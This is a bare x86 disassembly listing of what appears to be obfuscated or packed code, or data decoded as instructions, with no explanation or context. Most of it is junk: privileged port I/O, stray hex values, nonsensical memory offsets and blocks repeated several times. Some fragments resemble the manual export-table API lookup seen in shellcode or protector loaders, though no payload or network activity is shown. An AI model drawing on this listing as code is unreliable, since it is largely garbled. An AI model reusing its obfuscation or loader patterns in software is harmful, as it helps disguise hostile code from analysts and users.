add [ ecx + 0x2716a93d ] esp
push ss
cdq
add eax 0xd861b4da
push ebp
clc
xchg edx eax
and bl ah
out 0xb9 al
aas
jno rwxdata
iretd
sub ebx esp
add esp ebx
sti
mov al [ 0x27b728df ]
pop ss
mov [ edi ] dh
inc [ eax - 0x7f ]
ja rwxdata
add [ ebx + 0x62 ] cl
xor edi [ ebp + 0x416b3c8a ]
fnsave [ ecx - 0x3071ce5d ]
in al 0xba
in al 0xba
in al 0xba
or esi [ ecx + 0x5b ]
lahf
popfd
or [ esi - 0x35 ] dl
out dx al
rol [ ebp + 0x29d5e9d9 ] 0x1
test [ ecx + 0x24 ] edx
salc
jb rwxdata
mov al [ 0x43fc96a9 ]
add [ esi + eax * 4 + 0x3aac3259 ] 0xb5c89785
leave
test dl bh
fld [ eax + 0x55ffc890 ]
adc ecx [ ebp + ecx * 4 - 0x1 ]
jg rwxdata
sahf
mov esi 0xf9e876d1
stc
sub al al
jmp rwxdata
aas
and dl [ eax + ebp + 0x224fa4c2 ]
stc
mov bh 0x8a
insb
push ebx
xchg esp eax
sahf
and [ ecx ] dh
xor ebx [ edx ]
xor ecx [ esi - 0x70 ]
jo rwxdata
pop ecx
cmpsd [ esi ] [ edi ]
cmp [ ebp + 0x247a156e ] bh
dec esp
xor [ ebx + 0x7f7154cb ] 0xffffffd3
pop ss
jns rwxdata
[ edi ]
pushad
pushad
call sub_10149912
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
mov esi 0xe9fff528
scasd [ edi ]
cdq
adc ecx edx
popfd
push edx
in eax dx
call sub_101153b8
add di cx
xor di si
mov edi [ edx + 0x24 ]
pushfd
mov [ esp ] dh
push esp
add edi eax
bt esi esp
call sub_101466a1
sub_102044ab
stc
stc
sub al al
jmp rwxdata
[ edi ]
pushad
pushad
call sub_10149912
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
call sub_101153b8
add di cx
xor di si
mov edi [ edx + 0x24 ]
pushfd
mov [ esp ] dh
push esp
add edi eax
bt esi esp
call sub_101466a1
sub_102048d6
mov ebx eax
and ch 0x37
pop ecx
and cx 0xfb3a
mov edi eax
cmp al al
neg cx
bt di bx
mov ecx 0x104
call sub_102044ab
inc eax
xor al 0x6a
enter 0x4976 0x56
xchg edi eax
fucom st1
retn
sub_10204984
lea esp [ esp + 0x10 ]
je rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
jmp rwxdata
sub al 0x30
cmp dh dl
cmp al 0x9
pushfd
jmp rwxdata
mov [ esp ] 0xe6
lea esp [ esp + 0x4 ]
ja rwxdata
push edi
pushad
call sub_10201207
pushad
jmp rwxdata
imul edx edx 0xa
pushfd
push edi
stc
add edx eax
pushfd
pushfd
push edx
push esp
lea esp [ esp + 0x38 ]
jmp rwxdata
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
sub_10204b40
mov [ esp ] sp
jae rwxdata
call sub_10146fce
cmp eax 0x3b833fa0
stosd [ edi ]
xor ecx [ eax - 0x4882180 ]
xchg esp eax
outsd
fst [ edx - 0x13 ]
fld [ ecx + 0x5a ]
and eax 0x99a54956
jno rwxdata
push 0xf5564d03
cmp ecx [ ebp - 0x4 ]
call sub_1014be53
call sub_10201415
push ecx
mov ah 0x6b
lahf
pop edi
xor [ edi - 0x138e0760 ] cl
dec eax
add [ ebx + 0xc ] dh
scasb [ edi ]
jo rwxdata
stc
cmp ecx [ ebp - 0x4 ]
push ebp
call sub_10204bf9
mov dh 0x97
enter 0xa41b 0x4d
mov eax 0x497d460c
fsubr [ eax + ebx * 8 + 0x67 ]
in al dx
push ebx
mov ebx 0xff7f6063
mov edi 0x9c42603f
stosd [ edi ]
aam 0x2c
0x26f9e894 0x86c1
test di si
mov [ esp ] cx
sub ecx ecx
push [ esp ]
call sub_101469a8
lea esp [ esp + 0x38 ]
ja rwxdata
and eax 0x3feefbec
arpl sp bx
xor [ eax + 0x70 ] ch
push cs
test [ esi ] ah
mov [ 0x1c22ecdb ] eax
shr [ ebp + edi * 2 + 0x3d ] cl
push 0x75
sub [ esi + 0x2b ] edx
xchg ebx eax
sbb eax 0xd904bbe8
and eax 0x710bfae5
pop ebx
cwde
or [ esi + 0x39f9a579 ] eax
shr cl 0x1
inc ebx
sub al 0x0
add [ esi - 0x77 ] ah
and al 0x24
push esi
imul edi [ ebp - 0x21f2ae3f ] 0x9e691641
inc ecx
test al 0x36
inc edi
cli
and eax 0xf5643a36
and bh [ ebp + edx - 0x3 ]
sub dh [ ebp + eax * 8 + 0x2e0e4a9b ]
xchg edi eax
dec ebx
mov edx 0xdd61fdfb
rcr ebp 0xc1
daa
xor esi [ ecx - 0x156bd839 ]
xchg [ edi ] edx
dec eax
jpe rwxdata
pop es
adc al 0xb5
enter 0xc01e 0xb7
in al 0xe
dec [ ebp - 0x1c80b80e ]
les ebx [ ebx ]
sub esi [ edi + ebx * 2 + 0x28e955e0 ]
mul [ ebx - 0x5 ]
push ss
or [ ecx ] bl
jno rwxdata
sar esi 0xa0
fcomip st0
fisub [ ebp + 0x4e ]
push ecx
mov ecx 0xf1227d45
in eax dx
inc ebp
fidiv [ eax - 0x11 ]
mov bl 0xc
sbb eax 0x24f5e4db
mov ebx 0x8900fdb
retn 0xde20
scasd [ edi ]
mov eax 0x9e830ee4
xchg esp ecx
mov dh 0x98
pop edi
pop esi
enter 0xc63 0x54
das
cmpsb [ esi ] [ edi ]
sar [ ebx + 0x144e5b7 ] cl
aaa
inc edi
mov [ 0xffffffff85b3a7b5 ] al
0x606d
sbb bl [ ecx - 0x7b ]
aaa
dec esp
dec ebx
push esp
outsd
jo rwxdata
jmp rwxdata
xchg edi eax
in al 0xab
pop eax
lea sp [ esp + 0x8 ]
jae rwxdata
test al 0x22
cld
push ss
dec eax
xor cl [ esi + esi * 2 + 0x48 ]
xchg ebp eax
or [ edx + 0x2d ] esi
xchg edx eax
or eax 0x30affd22
test edx eax
jl rwxdata
cmp eax 0xb7c01ec8
test esp esi
push ecx
in eax dx
inc ecx
les ecx [ edi + 0x6b03823c ]
xor al 0x9b
stosd [ edi ]
jle rwxdata
nop
movsx dx al
je rwxdata
push eax
cmp cl 0x5
pushad
jmp rwxdata
mov ch 0x71
pop ebx
in eax dx
pop edi
xor [ ebx ] bl
jecxz rwxdata
fdiv st3
sub al 0x81

inc edi
pop eax
mov es cx
or dh [ esp + edx * 4 - 0x4aebf804 ]
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
add ecx 0x1
pushfd
call sub_10116e27
jpo rwxdata
btc ebx ebx
pushfd
mov ebx eax
jmp rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
xor ch dl
jle rwxdata
cmp [ ecx - 0x6b ] cl
scasb [ edi ]
popfd
out dx eax
push 0x37
xchg ecx eax
pushfd
mov edi 0x29ad9c83
push ds
ror [ 0x42f0b25e ] 0x1
push es
sub [ 0x59851302 ] edi
fisubr [ ecx - 0xd ]
add eax 0x44b5921b
0xc7029d85 0x4b73
clc
cmp al 0xaf
cmp [ edi ] 0x23
pushfd
lea esp [ esp + 0x8 ]
jne rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
xchg edi eax
add [ ebx ] 0x2f
scasd [ edi ]
cmp al 0x8f

xchg ebx eax
loope rwxdata
push cs
mov dl 0x6c
mov ebx 0x39e45bec
loopne rwxdata
xchg ch al
shrd cx bp cl
ror al 0x1
mov ecx edi
rcr al cl
cmc
mov al [ ecx ]
cmp si 0x4446
pushfd
pushad
mov ah al
clc
cmp bl 0xed
sub al 0xc7
mov [ esp + 0x4 ] dh
cmc
jmp sub_101599d3
sar ax 0xd
bts ax 0x1
sub edx edx
movsx ax bl
daa
sbb ax dx
aas
mov eax edx
dec al
test bl 0xe2
or al cl
add edi 0x1
and al 0x5f
adc al 0xd7
mov al [ edi ]
cmp eax edx
test al al
jmp rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
les edi [ edx - 0x5f50611f ]
mov dl 0x1e
fiadd [ ecx + 0x22ea95aa ]
xchg dl ch
xchg esp eax
jmp 0xffffffff9c0c8ab9
inc [ edi - 0x68 ]
sbb eax esp
mov edx 0xcc1e7f74
jg rwxdata
inc edi
cwde
je rwxdata
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
retn 0xc391
sti
dec eax
xchg ebp eax
mov edx 0x838ad5a5
jpo rwxdata
btc edi 0xc
not al
xor cl al
mov edi edx
stc
jmp rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
clc
stc
sub al 0x30
call sub_1014781a
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10204bf9
lea esp [ esp + 0x8 ]
jae rwxdata
movsx dx al
je rwxdata
push eax
cmp cl 0x5
pushad
jmp rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
add ecx 0x1
pushfd
call sub_10116e27
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10204cc4
push [ esp ]
mov [ esp + 0x4 ] 0x3c5bca9d
lea esp [ esp + 0x4 ]
jpo rwxdata
call sub_10148ad9
out dx al
jo rwxdata
push 0xd7dffdc5
pushad
pushfd
mov [ esp + 0x24 ] 0xe33cb1e9
push 0xefe54239
pushfd
mov [ esp + 0x8 ] 0xad43
mov [ esp + 0x8 ] 0x58d6
lea esp [ esp + 0x2c ]
jmp sub_1020d404
or [ 0x12d16e91 ] 0x65
lahf
fsubr st2
aam 0xe5
xchg edx eax
dec eax
test [ edx ] bl
sub eax 0x15ca3de1
adc eax [ eax + 0x56 ]
and eax 0x802b7348
insd
fisubr [ eax ]
neg [ esi + 0x8 ]
aaa
dec eax
popad
mov ebp 0xf660cd76
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
xchg ecx eax
ffree st2
cmpsb [ esi ] [ edi ]
pop ds
inc edx
push 0xd02b4fb6
adc ebp [ edx + 0x5d41ddcd ]
and dh [ ebx ]
jecxz rwxdata
jo rwxdata
jns rwxdata
popad
mov cl 0xad
ror ch cl
and [ esi + 0x29 ] edx
jge rwxdata
mov bh 0x58
sti
sub [ edi + 0x178c7b04 ] dl
out dx al
fist [ ebp + 0x31aee86f ]
scasb [ edi ]
movsd [ edi ] [ esi ]
0xe3fbbec1 0x4fa
xor [ 0x2b3416a9 ] ecx
0xe1293524 0x7ffe
push [ ebx ]
in al dx
push ds
rcl [ 0xffffffffe8215b71 ] 0xa7
cdq
insb
cmp ebx 0x2
jmp j_sub_1020799d
xchg [ eax - 0x31ae4ef3 ] bh
pmuludq mm2 [ ecx ]
push edx
mov ebx 0xb741b7b3
sub [ esi + 0x25 ] dh
pop edx
imul ebp [ ecx + ebx + 0x6419e84 ] 0x58
out dx eax
push eax
movsd [ edi ] [ esi ]
sub eax 0xe13d8372
cmc
mov esp 0xa3a836e2
ror [ 0x2dd13926 ] 0x1
or [ ebp + 0x69 ] esi
aad 0xe
mov cl 0xc6
cdq
jns rwxdata
sub eax 0x15ca3de1
scasd [ edi ]
cdq
push edx
fadd [ edx + 0x2e10fbc3 ]
jo rwxdata
fisttp [ ebx - 0x6ef27d96 ]
outsb
rcl [ edx ] 0x1
lahf
test al 0xb6
or [ esi - 0x498ad559 ] edx
pop eax
out 0x16 al
shl dh cl
adc eax 0x54435b1b
fnsave [ edx - 0x53c98e7e ]
pop ecx
lodsd [ esi ]
in eax 0xfa
adc [ cs : ecx ] ah
inc edi
jno rwxdata
and [ esi - 0x18e84cd5 ] edi
out 0x38 al
scasb [ edi ]
adc [ edx ] esp
jno rwxdata
aas
inc ecx
push esi
pushad
jno rwxdata
sahf
inc ecx
push es
pop eax
or dh [ ebp - 0x22 ]
popad
sbb eax 0x8fa00b95

pop edi
mov edi 0xc6614e
cmp [ ebx + ecx * 2 ] al
in al 0x71
sub eax 0x67421f26
test al 0xa3
and bl bl
mov ah 0xb7
sub_10204d05
mov edx [ esp + 0x4 ]
mov [ esp + 0x4 ] di
not bl
movzx di dl
mov ebx [ esp + 0x8 ]
pushad
not edi
pop edi
mov edi [ esp + 0x28 ]
lea esi [ esi * 4 + 0x58751a6a ]
mov esi [ esp + 0x2c ]
mov [ esp ] 0x2a8f
jmp rwxdata
mov esp ebp
bswap bp
pop ebp
push esp
push [ esp + 0x4 ]
retn 0x10
sub_10204d3b
shr ecx 0x1
xchg di bx
mov edi [ esi ]
inc bl
btr bx 0x6
add edi [ ebp + 0x10 ]
bsf bx bx
add esi 0x8
add esp 0x8
btc bx 0x8
bswap bx
clc
jmp rwxdata
mov bx [ esi ]
pushad
shr ebx 0xc
bt dx 0x6
bt dx cx
cmp ebx 0x1
call sub_1020bc51
movsb [ edi ] [ esi ]
cmp al 0xc2
ror [ esi ] 0x1
sub_10204f8b
lea esp [ esp + 0x48 ]
je rwxdata
pushfd
call sub_102055eb
stc
pushfd
add esp ebx
sti
pop edi
aas
add [ esi - 0x1f975431 ] 0xe9
sbb al 0x5b
add al 0xd6
test eax 0xbe806e10
xchg ebp eax
stosb [ edi ]
int 0x92
sub dh dh
in eax 0x3a
sbb al 0x42
pop esp
inc edx
pop esp
inc edx
jge rwxdata
stc
push 0x6796fcb6
cmc
cmp ah 0x2e
push 0x746ffe8b
mov [ esp + 0x4 ] 0x94
push esi
push [ esp + 0xc ]
retn 0x10
pop ebx
jle rwxdata
jo rwxdata
cwde
int3
cmpsb [ esi ] [ edi ]
cmp esi ecx
adc edx edi
test eax 0x1f49a115
aad 0x3
inc eax
xchg esp eax
sub ch [ ebx - 0x58 ]
mov bh 0x43
pop ecx
sub ch [ ebx + esi * 4 ]

sub_10205076
push ebp
fistp [ edi ]
iretd
aam 0xca
sbb al 0xc2
dec esp
shl [ ebp + 0xdf20cba ] cl
xor al [ ebx ]
cmp ecx [ edi + 0x429a89b5 ]
xchg esi eax
inc eax
sub bl [ ecx + 0x7c ]
test al 0x37
mov ebp 0x5e801338
jb rwxdata
fstp st4
jecxz rwxdata
sub eax 0x73845a3e
aam 0x4c
jg rwxdata
stosb [ edi ]
jle rwxdata
lea esp [ esp + 0x2c ]
call sub_101ffc63
call sub_10208e91
or al 0x1d
and ch [ ebp + 0x52 ]
fld [ edx + 0x53 ]
and [ esi - 0x674c6a59 ] ch
aaa
into
mov dh dl
cwde
xor [ es : esi + 0x71 ] ecx
rwxdata
adc eax 0x1b0af4e9
jno rwxdata
test ah al
test [ edi ] 0xb7
0x7da6aecb 0xd2c1
pop ebp
jmp 0xfffffffffad758cb
dec edi
xchg ecx eax
stc
xchg esi eax
and [ eax - 0x56 ] 0x24648d60
inc eax
jmp sub_101446f5
sub_102055d7
lea esp [ esp + 0x1c ]
je rwxdata
movsx dx al
je rwxdata
call sub_1020a973
call sub_10207124
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
pop edi
sub esi edx
popad
je rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
_start
pushfd
call sub_1020a0ba
lea esp [ esp + 0x28 ]
jne rwxdata
push edi
pushad
call sub_10201207
not ah
call sub_10115a40
scasd [ edi ]
sahf
rcl [ ebp + 0x2ef031c9 ] 0x3f
dec ebp
mov eax 0xb6550447
inc eax
pop esi
rol [ ecx ] 0x36
cmpsb [ esi ] [ edi ]
lahf
dec [ edx + 0x7f ]
sub_102057d4
push esi
add [ ebx + edi ] edx
sub esp 0xfffffff0
jmp rwxdata
add esi 0x2
jmp rwxdata
pushad
pushad
pushfd
dec ecx
push esi
lea esp [ esp + 0x48 ]
jne rwxdata
btc bx 0x8
bswap bx
clc
jmp rwxdata
seto cl
bt bp 0x1
xor cl ah
mov ecx [ ebp - 0x4 ]
pushfd
bt bx 0xc
cmp [ ebp + 0x14 ] ecx
jmp sub_10115b2d
mov bx [ esi ]
pushad
shr ebx 0xc
bt dx 0x6
bt dx cx
cmp ebx 0x1
call sub_1020bc51
movsb [ edi ] [ esi ]
cmp al 0xc2
ror [ esi ] 0x1
sub_1020618e
mov [ esp ] dh
lea esp [ esp + 0xc ]
jae rwxdata
bswap edx
mov bl 0x5d
xchg si bx
pop edx
call sub_102031b5
add [ eax ] al
inc ebx
outsd
inc ebx
jb rwxdata
shld bx cx cl
inc bl
ror ecx cl
shr bh cl
mov ebx eax
movsx ecx cl
btc ecx esi
sbb ch dl
bt bp bp
mov edi eax
push ebp
xor ch dh
btc cx si
mov ecx 0x104
pushfd
pushad
sub al al
push 0xcba93cf1
bt si ax
[ edi ]
pushfd
push ecx
lea esp [ esp + 0x34 ]
jne rwxdata
pop edi
sub esi edx
popad
je rwxdata
movsx dx al
je rwxdata
bswap cx
dec esi
cmc
jmp rwxdata
pop es
div [ edi + 0x8 ]
cdq
add eax 0xe13e1ec1
imul esi esi 0x716726f9
pop ebx
dec eax
pop ecx
jmp rwxdata
dec ecx
outsb
jae rwxdata
call sub_1014ac34
fcom [ eax + 0xe ]
adc eax 0x7b6a554a
shr [ ebp - 0x20e6b7b7 ] cl
imul edx [ esi + 0x4e78a788 ] 0x886975b0
jge rwxdata
rcl bl cl
adc di 0x7eed
xor eax eax
mov ecx edi
pushad
bsr si sp
or si sp
rol si cl
sub ecx ebx
call sub_1011e8f2
test [ eax ] 0x19
imul [ eax ]
cmp [ ebx + 0x2b ] edx
les edi [ ss : eax - 0x35 ]
into
push esp
adc ebp [ ebx ]
add ecx [ 0x51f87635 ]
stosb [ edi ]
jns rwxdata
cmp [ edx + ecx * 4 + 0xb96555 ] 0x7e
nop
mov ss [ ebp + 0x6a ]
out dx eax
outsd
xor [ esi + 0x49 ] 0x5a
add [ edi - 0x555d10a8 ] bl
adc dh cl
pop edi
fwait
jae rwxdata
scasd [ edi ]
popad
outsb
arpl [ ebp ] sp
mov [ esp + 0x28 ] 0xa401f29b
pushfd
mov [ esp ] 0xae
push eax
mov [ esp + 0x4 ] 0x311ec6de
lea esp [ esp + 0x30 ]
jmp sub_1020d404
mov [ ebp - 0x3 ] bh
cmp [ esi ] 0x706dd161
popad
pop esi
adc ebp [ ebx ]
xlat
xchg [ ebx - 0x74 ] edx
popfd
out dx eax
stc
movsb [ edi ] [ esi ]
stosd [ edi ]
js rwxdata
mov dh dh
pop es
inc eax
in eax dx
rol [ ebp - 0x7a ] 0xa3
mov esp 0x3de30d00
or eax [ ebx ]
pushfd
dec edi
ror dh 0x1
ror bl 0x1
mov ah 0xe7
cwde
jb rwxdata
pop ds
fld [ 0x7c3107b7 ]
jo rwxdata
xor cl ch
pop ss
dec ebp
or al 0x0
xchg ebp eax
dec edi
iretd
add dh bh
aas
pop ebp
xchg edx ebx
idiv cl
jno rwxdata
mov ecx esp
cmp al 0xc9
push esi
fisttp [ edi ]
xlat
sbb [ edx ] bl
das
push edi
xchg [ eax - 0x7edd3653 ] ebx
mov eax 0x39afa11e
cmpsb [ esi ] [ edi ]
mov [ edi - 0x6ae3f42d ] gs
cmp eax 0xa464c162
rcr ebp cl
retn 0xd271
xchg esi eax
stc
mov edx 0xe9d6e304
xchg ecx eax
pop ebx
sub_10206a8d
lea esp [ esp + 0xc ]
ja rwxdata
movsx ecx bl
shl cl 0x7
mov ecx [ esi + 0x4 ]
stc
cmp bl 0x38
or ecx ecx
pushad
mov [ esp + 0x4 ] bl
jmp rwxdata
lea esi [ ebx * 8 + 0x4a13f57e ]
mov bh 0x44
pop esi
movsx di cl
bswap di
mov ebx eax
lea edi [ eax + 0x36287ca4 ]
pop edi
call j_sub_1020b448
pushad
lea esp [ esp + 0x40 ]
je rwxdata
call sub_10149924
cmp al 0x38
jne rwxdata
int1
pop ebx
mov bl 0x3e
and bh bl
xchg ebp eax
loope rwxdata
int1
out 0xd8 eax
sbb al 0xa2
cmp al 0x86
cmp [ ebp - 0x638ed2cf ] cl
sub_10206b56
push edi
mov [ esp + 0x3c ] eax
movzx ax al
lea eax [ esi + 0xedebb7c ]
mov [ esp + 0x38 ] 0xb
movsx ax bl
pop eax
movsx eax dl
setge al
lea eax [ rwxdata ]
pushfd
call sub_102057ce
inc edx
das
push eax
mov esi 0x1c07e60
sbb esp [ edx ]
out 0x61 eax
int 0x91
sbb al 0xe9
salc
leave
mov dh [ ebp + 0x621c9dc2 ]
mov [ esi - 0x79876dd4 ] edx
sbb [ esi + 0x2ed0f648 ] esp
insd
adc ah [ ebx ]
sbb ebp [ eax + ebx * 8 ]
mov dx 0x3f7f
mov ch 0x50
popad
aaa
cmpsd [ esi ] [ edi ]
test [ ecx - 0x777257ca ] bh
js rwxdata
in al dx
pop ss
neg [ edi - 0x7a96897e ]
mov ecx 0x1f8b72ca
cwde
push ds
dec edx
adc eax 0xe522bd26
cli
or eax 0xca1693d2
iretd
sub_10206e19
lea esp [ esp + 0x4 ]
jb rwxdata
clc
call sub_1014720b
cmp al 0x9
jmp rwxdata
jmp rwxdata
mov [ esp + 0x8 ] 0x5b
push [ esp + 0x4 ]
lea esp [ esp + 0x10 ]
ja rwxdata
pushfd
mov [ esp ] 0x8fce08aa
cmp [ edi - 0x1 ] 0x0
pushad
lea esp [ esp + 0x24 ]
jae rwxdata
push edi
pushad
call sub_10201207
pushfd
bt ebx ebx
stc
imul edx edx 0xa
clc
cmc
add edx eax
push [ esp ]
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
push ebx
push 0x9b2aff71
lea esp [ esp + 0xc ]
jne rwxdata
push 0x3e5a7d47
lea esp [ esp + 0x4 ]
jne rwxdata
jmp rwxdata
call sub_101153b8
cmc
mov edi [ edx + 0x24 ]
pushfd
add edi eax
push 0x280c3e5d
movzx ecx [ edi + ecx * 2 ]
ror di 0x9
call sub_1020ad0d
add di 0x9fc5
rcl di 0x4
mov edi [ edx + 0x24 ]
cmc
bt esp esi
push 0x3c5acc54
pushad
add edi eax
push edx
movzx ecx [ edi + ecx * 2 ]
sub esp 0xffffffd8
jmp rwxdata
rcl al 0x3
rcl al cl
clc
add edi 0x1
rol al 0x1
inc al
mov al [ edi ]
cmc
test al al
pushfd
jmp sub_101441d3
in al 0xe7
pushad
or [ ebx + 0x2c17ce7a ] 0xffffffab
adc al 0x4c
std
aad 0x0
inc ebp
xor [ ebp + 0x4a ] 0x46d119fa
out dx eax
push ebp
0x33ac1aa5 0xe244
dec edx
pop ebx
0x97843bb1 0xf378
adc ebx [ ecx - 0x196e3144 ]
scasd [ edi ]
adc [ ebx ] ch
sbb al 0x2c
pop ebp
shld di dx cl
dec di
mov edi [ edx + 0x1c ]
stc
pushfd
pushfd
push ebp
add edi eax
bt sp 0x8
mov edi [ edi + ecx * 4 ]
test cx ax
test edi edi
push [ esp + 0x4 ]
pushfd
call sub_10147cf1
xchg esi eax
dec eax
pshufw mm6 [ ebx + 0x120dbdac ] 0x68
mov bh 0x28
cmp ecx [ 0x10ee1c82 ]
mov dl 0xc
sti
in al 0x96
call 0x4bc7564
out dx eax
